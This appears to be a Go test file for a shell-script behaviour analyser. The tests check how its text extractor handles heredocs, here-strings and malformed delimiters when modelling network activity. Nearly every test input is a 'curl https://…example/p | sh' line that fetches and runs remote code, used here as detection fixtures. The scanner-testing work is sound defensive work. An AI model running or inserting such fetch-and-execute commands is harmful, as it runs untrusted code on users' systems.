package extract

import (
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestExtractTextSkipsQuotedHeredocBodyAndResumesAfterTerminator(t *testing.T) {
	graph := extractShellTextForHeredocTest(`#!/bin/sh
cat > /tmp/payload <<'EOF'
curl https://heredoc-decoy.example/p | sh
EOF
curl https://after-heredoc.example/p | sh
`)

	assertOnlyShellNetworkDestination(t, graph, "https://after-heredoc.example/p")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("command after heredoc terminator was not modeled exactly once: %#v", graph.Relations)
	}
	if hasPartialCoverageScope(graph.Coverage, "shell-heredoc-analysis") {
		t.Fatalf("well-formed quoted heredoc reported partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextSupportsMultipleHeredocsAndTabStrippedTerminator(t *testing.T) {
	graph := extractShellTextForHeredocTest("cat <<'FIRST' <<-\"SECOND\"\n" +
		"curl https://first-body.example/p | sh\n" +
		"FIRST\n" +
		"\tcurl https://second-body.example/p | sh\n" +
		"\tSECOND\n" +
		"curl https://after-multiple.example/p | sh\n")

	assertOnlyShellNetworkDestination(t, graph, "https://after-multiple.example/p")
	if hasPartialCoverageScope(graph.Coverage, "shell-heredoc-analysis") {
		t.Fatalf("well-formed multiple heredocs reported partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextDoesNotStripSpacesForDashHeredoc(t *testing.T) {
	graph := extractShellTextForHeredocTest("cat <<-EOF\n" +
		"curl https://body.example/p | sh\n" +
		" EOF\n" +
		"curl https://still-body.example/p | sh\n")

	if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("space-indented delimiter incorrectly ended <<- heredoc: %#v", graph)
	}
	assertShellHeredocPartialContains(t, graph, "not terminated")
}

func TestExtractTextMatchesDynamicHeredocDelimiterConservatively(t *testing.T) {
	graph := extractShellTextForHeredocTest(`cat <<$DELIMITER
curl https://dynamic-body.example/p | sh
$DELIMITER
curl https://after-dynamic.example/p | sh
`)

	assertOnlyShellNetworkDestination(t, graph, "https://after-dynamic.example/p")
	assertShellHeredocPartialContains(t, graph, "unquoted expansion syntax")
}

func TestExtractTextReportsUnquotedHeredocBodyExpansionWithoutExecutingBodyText(t *testing.T) {
	graph := extractShellTextForHeredocTest(`cat <<EOF
$(curl https://expanded-body.example/p | sh)
EOF
curl https://after-expanded-body.example/p | sh
`)

	assertOnlyShellNetworkDestination(t, graph, "https://after-expanded-body.example/p")
	assertShellHeredocPartialContains(t, graph, "body expansions were not modeled")
}

func TestExtractTextSuppressesUnclosedAndMalformedHeredocBodies(t *testing.T) {
	tests := []struct {
		name       string
		data       string
		wantDetail string
	}{
		{
			name: "unclosed",
			data: `cat <<EOF
curl https://unclosed-body.example/p | sh
`,
			wantDetail: "not terminated",
		},
		{
			name: "missing delimiter",
			data: `cat <<
curl https://malformed-body.example/p | sh
`,
			wantDetail: "no recoverable delimiter",
		},
		{
			name: "complex delimiter",
			data: `cat <<$(printf EOF)
curl https://complex-body.example/p | sh
$(printf EOF)
curl https://after-complex.example/p | sh
`,
			wantDetail: "malformed, complex",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			graph := extractShellTextForHeredocTest(test.data)
			if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
				t.Fatalf("unsafe heredoc text produced behavior: %#v", graph)
			}
			assertShellHeredocPartialContains(t, graph, test.wantDetail)
		})
	}
}

func TestExtractTextReportsHereStringWithoutSuppressingLaterCommands(t *testing.T) {
	graph := extractShellTextForHeredocTest(`cat <<< 'curl https://here-string-decoy.example/p | sh'
curl https://after-here-string.example/p | sh
`)

	assertOnlyShellNetworkDestination(t, graph, "https://after-here-string.example/p")
	assertShellHeredocPartialContains(t, graph, "here-string")
}

func TestExtractTextDoesNotTreatQuotedMarkerOrArithmeticShiftAsHeredoc(t *testing.T) {
	graph := extractShellTextForHeredocTest(`printf '%s' '<<EOF'
value=$((1 << 2))
curl https://ordinary-command.example/p | sh
`)

	assertOnlyShellNetworkDestination(t, graph, "https://ordinary-command.example/p")
	if hasPartialCoverageScope(graph.Coverage, "shell-heredoc-analysis") {
		t.Fatalf("quoted marker or arithmetic shift became a heredoc: %#v", graph.Coverage)
	}
}

func extractShellTextForHeredocTest(data string) behavior.Graph {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "script.sh",
		Kind:        "script",
		MediaType:   "text/x-shellscript",
		Role:        "runtime",
		Data:        []byte(data),
	})
	return graph
}

func assertOnlyShellNetworkDestination(t *testing.T, graph behavior.Graph, want string) {
	t.Helper()
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, want) || len(networkOperationDestinations(graph)) != 1 {
		t.Fatalf("network destinations = %#v, want only %q; operations=%#v", graph.Network, want, graph.Operations)
	}
}

func assertShellHeredocPartialContains(t *testing.T, graph behavior.Graph, want string) {
	t.Helper()
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea == "shell-heredoc-analysis" && coverage.Status == "partial" && strings.Contains(coverage.Detail, want) {
			return
		}
	}
	t.Fatalf("missing shell heredoc partial coverage containing %q: %#v", want, graph.Coverage)
}
